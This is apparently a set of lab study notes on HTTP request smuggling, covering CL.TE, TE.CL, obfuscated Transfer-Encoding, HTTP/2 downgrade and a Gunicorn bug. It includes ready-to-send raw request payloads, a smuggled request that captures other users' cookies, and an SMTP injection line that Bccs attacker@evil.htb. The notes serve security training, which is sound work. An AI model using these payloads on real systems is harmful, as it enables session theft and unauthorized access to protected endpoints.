# HTTP Request Smuggling

The frontend proxy and backend server disagree on where one HTTP request ends and the next begins. That gap lets you prepend content to another user's request, access admin endpoints, steal cookies, and more.

---

## Background: How Smuggling Works

HTTP/1.1 has two ways to indicate request body length:
- `Content-Length` (CL): explicit byte count
- `Transfer-Encoding: chunked` (TE): body is split into chunks, ends with `0\r\n\r\n`

When a proxy and backend disagree about which to use, they "split" the byte stream differently. One server thinks request A ended, but the other thinks there's still data left — which becomes the prefix of the next request.

---

## CL.TE Smuggling

**Scenario:** Frontend uses Content-Length. Backend uses Transfer-Encoding.

**How:** Send a request where CL says the body is 51 bytes, but TE makes the backend stop reading after the first chunk (`0\r\n\r\n`). The leftover bytes become the start of the next request on the backend.

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 51
Transfer-Encoding: chunked

0

GET /admin.php?reveal_flag=1 HTTP/1.1
Dummy: x
```

The frontend reads 51 bytes (the full body including the smuggled GET). The backend processes only up to the `0\r\n\r\n`, leaving `GET /admin.php...` in the buffer. The next legitimate request from any user gets that prepended to it, and the backend processes `/admin.php?reveal_flag=1` in the context of that user's request.

**Lab result:** Flag exposed globally once the smuggled request executes.

---

## TE.TE — Obfuscated Transfer-Encoding

**Scenario:** Both frontend and backend support chunked encoding, but you can make one of them ignore the `Transfer-Encoding` header by obfuscating it.

**Technique:** Add a vertical tab (`\x0b`) or other whitespace/special character to confuse one parser:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding:\x0bchunked

0

```

One server sees `Transfer-Encoding: chunked` and uses TE. The other sees the obfuscated second `Transfer-Encoding` and falls back to CL. This creates the same frontend/backend disagreement as CL.TE.

In one lab, a bare carriage return (`\r`) in the header value tricks the proxy into treating it as TE while the backend uses CL.

---

## TE.CL Smuggling

**Scenario:** Frontend uses Transfer-Encoding. Backend uses Content-Length.

**How:** The frontend parses the full chunked body. The backend reads only `CL` bytes and leaves the rest as a new request.

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

reveal_flag=1
0

```

The frontend processes the full chunked body. The backend reads 4 bytes (`5e\r\n`) as the body and leaves the rest — the `POST /admin` — in the buffer.

**Note on byte counts:** The chunk size (`5e` = 94 in decimal) must exactly match the number of bytes in the smuggled request body. Off-by-one errors cause silent failures or server errors.

---

## H2.CL Smuggling (HTTP/2 Downgrade)

**Scenario:** Frontend accepts HTTP/2. Backend speaks HTTP/1.1. The frontend downgrades and injects a `Content-Length` header.

**How:** HTTP/2 doesn't have Content-Length ambiguity (framing is done at a lower level). But when the frontend downgrades to HTTP/1.1 for the backend, it adds a `Content-Length` header. If you can inject your own `Content-Length` in the HTTP/2 request's headers, it overrides what the proxy sends.

```
:method POST
:path /
:authority TARGET
content-length: 0
Foo: bar\r\nContent-Length: 100

[real body - 0 bytes from H2 frame]
```

The backend receives `Content-Length: 100` and waits for 100 bytes, which come from the next user's request. That user's request gets prepended with your smuggled content.

**Lab:** Armeria proxy + Apache backend. Smuggle a GET to `/admin/index.php?reveal_flag=1` with a dummy trailing header. The next request (from the admin bot) completes the HTTP/1.1 request to the backend with the admin's Cookie, which reveals the flag.

---

## Stealing Cookies via Smuggling

The most impactful smuggling scenario: poison the backend's buffer so the next user's request body includes your partial request — and their Cookie header gets appended to your comment/body.

**Setup:**
1. There's a POST endpoint that stores request body content (e.g., `/comments.php`)
2. You can read the stored content later

**Smuggled request:**
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 256
Transfer-Encoding: chunked

0

POST /comments.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Cookie: YOUR_SESSION
Content-Length: 500

name=hacker&csrf=TOKEN&comment=
```

The `Content-Length: 500` in the smuggled request makes the backend wait for 500 bytes of body. The next user's full request (including their Cookie header) gets read as the body of the comment POST. When you view the stored comment, you see their Cookie.

**Getting the CSRF token:**
Before smuggling the comment POST, you need a valid CSRF token from the form. Fetch `/comments.php` first to extract it, then use it in the smuggled request.

---

## Gunicorn WebSocket Key Bug

Gunicorn has a bug where certain HTTP headers cause it to truncate the body to 8 bytes. Specifically, a `Sec-Websocket-Key1` header triggers this.

**Exploit:**
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 100
Sec-Websocket-Key1: x

GET /admin HTTP/1.1
Host: TARGET

[only the first 8 bytes of this body are read by gunicorn]
```

Gunicorn reads only 8 bytes of the body. The remaining bytes (`GET /admin...`) are left in the buffer, becoming the next request.

---

## Skills Assessment — Chained Smuggling + SMTP Injection

This chains TE.CL/TE.TE to bypass a WAF and smuggle a POST request to a contact form that's vulnerable to SMTP injection.

### Steps

1. **Discover the smuggling type:** Send test requests with `Transfer-Encoding: chunked\r chunked` (bare CR before the second `chunked`) — this tricks some WAFs into ignoring TE while the backend uses CL.

2. **Find the hidden admin path:** Smuggle a POST to `/contact` with SMTP injection in the email body to receive a copy of the contact email. The email reveals a hidden admin path.

3. **Use a second smuggling request** to access the hidden admin path, bypassing the WAF that normally blocks direct access.

### SMTP Injection Payload (in contact form body)

```
name=legit%0d%0aBcc%3a+attacker%40evil.htb&email=x@x.com&message=hello
```

The resulting email is CC'd to `attacker@evil.htb`. Check MailHog for the full email contents including any links/paths.

---

## Tooling Tips

- Use Burp's Repeater with "Update Content-Length" **disabled** — you're controlling the length manually
- In Burp, switch to raw mode to add literal `\r\n` — the visual editor sometimes auto-corrects them
- For TE.CL, calculate chunk sizes carefully: `hex(len(smuggled_body))`
- For byte-perfect payloads, count characters including `\r\n` at the end of headers
- Always test with a time-delay first (`sleep(5)` in the smuggled request) to confirm you have a working primitive before trying cookie theft or flag access
